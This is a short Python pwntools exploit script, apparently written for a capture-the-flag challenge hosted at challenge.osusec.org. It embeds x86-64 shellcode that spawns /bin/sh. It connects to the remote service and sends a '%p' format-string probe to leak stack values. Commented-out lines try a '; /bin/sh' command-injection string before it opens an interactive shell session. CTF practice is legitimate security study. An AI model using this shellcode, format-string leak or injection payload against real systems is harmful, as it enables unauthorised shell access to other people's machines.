#!/usr/bin/env python3
from pwn import *

# nonzero 64 shellcode
shellcode = 'jlX\x0f\x05H\x89\xc7H\x89\xc6jrX\x0f\x05H\xbb//bin/shH1\xc0PSH\x89\xe7H\x89\xc6H\x89\xc2j;X\x0f\x05'

# process
# p = process("./ncep_xqc")
# remote
p = remote("challenge.osusec.org", 31314)

print(p.recvline().strip())
p.sendline(b"%p %p %p %p %p %p %p %p")
# p.sendline(b"") # send default args
# p.sendline(b"; /bin/sh") # send default args
# print(p.recv())

# p.sendline(shellcode)

p.interactive()